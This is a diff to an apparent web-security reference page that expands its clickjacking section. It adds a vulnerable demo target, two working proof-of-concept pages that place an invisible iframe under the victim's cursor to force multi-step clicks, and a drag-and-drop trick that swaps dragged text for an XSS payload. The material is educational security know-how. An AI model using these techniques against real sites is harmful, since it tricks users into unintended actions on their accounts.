@@ -499,11 +499,164 @@ Here are some examples of how to get window reference containing your target:
 </strong>&#x3C;/script>
 </code></pre>
 
-#### [Clickjacking](https://portswigger.net/web-security/clickjacking)
+#### Clickjacking
+
+{% embed url="https://portswigger.net/web-security/clickjacking" %}
+Clear explanation of Clickjacking with labs for practice
+{% endembed %}
 
 If the target page allows being put into an `<iframe>`, your site above the iframe can put a barely transparent overlay over the frame to trick the user into clicking certain parts of the frame. This technique known as 'clickjacking' requires cookies in a third-party context, and thus `SameSite=None`, but can be very effective if there is enough reason for the user to follow your instructions, like a game or a captcha.
 
+For **multiple clicks** and to make it easier for the victim to click all the required buttons, we can make use of [`clip()`](https://developer.mozilla.org/en-US/docs/Web/CSS/clip) or [`scale()`](https://developer.mozilla.org/en-US/docs/Web/CSS/transform-function/scale) CSS properties on iframes. This allows the attack to position the button under the user's mouse cursor always.
+
+{% code title="Vulnerable example" %}
+```html
+<h1>Target</h1>
+<button onclick="step2.style.display = 'unset'">Step 1</button>
+<button id="step2" onclick="step3.style.display = 'unset'" style="display: none">Step 2</button>
+<button id="step3" onclick="step4.style.display = 'unset'" style="display: none">Step 3</button>
+<button id="step4" onclick="alert()" style="display: none">Step 4</button>l
+```
+{% endcode %}
+
+Below are two configurable proof of concept's that achieve the same effect: click anywhere to continue to the next step. Use [`.getBoundingClientRect()`](https://developer.mozilla.org/en-US/docs/Web/API/Element/getBoundingClientRect) in your DevTools on the target page to get the coordinates of certain buttons into the `positions` array, and resize the iframe's `width=` to make it consistent.
+
+<details>
+
+<summary>Automatic <code>clip()</code> PoC</summary>
+
+<figure><img src="../../.gitbook/assets/clickjacking-clip.gif" alt=""><figcaption><p>Recording of proof of concept with <code>0.5</code> opacity for debugging</p></figcaption></figure>
+
+```html
+<h1>Clickjacking PoC using clip()</h1>
+<p id="hint"></p>
+<iframe id="iframe" width="320px" src="http://127.0.0.1:8000/target.html"></iframe>
+<script>
+  const steps = [
+    // .getBoundingClientRect()
+    { pos: [8, 66], size: [54, 21] },
+    { pos: [66, 66], size: [54, 21] },
+    { pos: [125, 66], size: [54, 21] },
+    { pos: [183, 66], size: [54, 21] },
+  ];
+  let i = 0;
+  let mouse = [0, 0];
+
+  function resizeToStep(i) {
+    const step = steps[i];
+    if (!step) return;
+    iframe.style.transform = `translate(${mouse[0] - step.pos[0] - step.size[0] / 2}px, ${mouse[1] - step.pos[1] - step.size[1] / 2}px)`;
+    iframe.style.clip = `rect(${step.pos[1]}px, ${step.pos[0] + step.size[0]}px, ${step.pos[1] + step.size[1]}px, ${step.pos[0]}px)`;
+  }
+  function updateHint() {
+    hint.innerText = `Click ${steps.length} times anywhere (${i}/${steps.length})`;
+  }
+
+  onblur = () => {
+    setTimeout(() => {
+      if (document.activeElement.tagName === "IFRAME") {
+        window.focus();
+        resizeToStep(++i);
+        updateHint();
+      }
+    }, 100);
+  };
+  onmousemove = (e) => {
+    mouse = [e.clientX, e.clientY];
+    resizeToStep(i, e);
+  };
+  resizeToStep(i);
+  updateHint();
+</script>
+<style>
+  iframe {
+    position: fixed;
+    top: 0;
+    left: 0;
+    transform-origin: top left;
+    border: none;
+    opacity: 0;
+  }
+</style>
+
+```
+
+</details>
+
+<details>
+
+<summary>Automatic <code>scale()</code> PoC</summary>
+
+<figure><img src="../../.gitbook/assets/clickjacking-scale.gif" alt=""><figcaption><p>Recording of proof of concept with <code>0.5</code> opacity for debugging</p></figcaption></figure>
+
+<pre class="language-html"><code class="lang-html">&#x3C;h1>Clickjacking PoC using scale()&#x3C;/h1>
+&#x3C;p id="hint">&#x3C;/p>
+&#x3C;iframe id="iframe" width="320px" src="http://127.0.0.1:8000/target.html">&#x3C;/iframe>
+&#x3C;script>
+  const steps = [
+    // .getBoundingClientRect()
+    { pos: [8, 66], size: [54, 21] },
+    { pos: [66, 66], size: [54, 21] },
+    { pos: [125, 66], size: [54, 21] },
+    { pos: [183, 66], size: [54, 21] },
+  ];
+  let i = 0;
+
+  function resizeToStep(i) {
+    const step = steps[i];
+    if (!step) return;
+<strong>    iframe.style.transform = `scale(${innerWidth / step.size[0]}, ${innerHeight / step.size[1]}) translate(${-step.pos[0]}px, ${-step.pos[1]}px)`;
+</strong>  }
+  function updateHint() {
+    hint.innerText = `Click ${steps.length} times anywhere (${i}/${steps.length})`;
+  }
+
+  onblur = () => {
+    setTimeout(() => {
+      if (document.activeElement.tagName === "IFRAME") {
+        window.focus();
+        resizeToStep(++i);
+        updateHint();
+      }
+    }, 100);
+  };
+  onresize = () => resizeToStep(i);
+  resizeToStep(i);
+  updateHint();
+&#x3C;/script>
+&#x3C;style>
+  iframe {
+    position: fixed;
+    top: 0;
+    left: 0;
+    transform-origin: top left;
+    border: none;
+    opacity: 0;  /* For debugging, increase this to see the target */
+  }
+&#x3C;/style>
+
+</code></pre>
+
+</details>
+
 Instead of clicks, this technique can go even further with overwriting clipboard/drag data to make the user unintentionally fill in forms, or carefully show parts of the iframe to make the user re-type what is on their screen back to you.
+
+The [`dataTransfer`](https://developer.mozilla.org/en-US/docs/Web/API/DragEvent/dataTransfer) property allows you to alter data after it is dragged. This makes it easy to make a proof of concept where the victim drags a certain text into a field.
+
+<pre class="language-html"><code class="lang-html">&#x3C;img src="https://picsum.photos/200/300">
+&#x3C;script>
+  // When the user drags the image
+  ondragstart = () => {
+    event.dataTransfer.clearData();
+    // Replace the data on the cursor, so when dropped, writes this text
+<strong>    event.dataTransfer.setData("text/plain", `&#x3C;img src onerror=alert(origin)>`);
+</strong>  }
+&#x3C;/script>
+</code></pre>
+
+{% hint style="info" %}
+**Note**: you cannot drag into cross-origin iframes, it must be another tab or popup window.
+{% endhint %}
 
 #### [XS-Leaks](https://xsleaks.dev/)
 
